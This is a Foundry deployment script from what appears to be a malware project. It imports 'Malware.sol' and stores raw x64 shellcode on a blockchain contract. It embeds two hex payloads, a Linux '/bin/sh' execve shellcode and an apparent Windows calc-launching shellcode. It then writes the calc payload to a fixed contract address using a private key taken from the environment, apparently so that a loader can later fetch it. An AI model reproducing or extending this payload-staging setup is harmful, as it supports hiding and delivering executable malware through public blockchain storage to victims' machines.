
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Contracts/Malware.sol";

contract DeployShellcodeStorage is Script {
    function setUp() public {}

    function run() public {
        // Linux x64 shellcode to execute "/bin/sh"
        address c = 0xD57c5867BbD350B97cff9FAd9569089a0Af2EC1d;
        bytes memory linuxShellcode = hex"6a3b589948bb2f62696e2f73680048c1eb0853545f997531c0f05a";
        bytes memory calc = hex"6a605a6863616c6354594829d465488b32488b7618488b761048ad488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b34ae4801f799ffd7";
         
        // Start broadcasting transactions
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        // Deploy the contract with the shellcode
        //ShellcodeStorage shellcodeStorage = new ShellcodeStorage(linuxShellcode);
        ShellcodeStorage(c).updateShellcode(calc);
        // Stop broadcasting transactions
        vm.stopBroadcast();

        // Log the deployed contract address
        console.log("Contract deployed at:", address(c));
    }
}
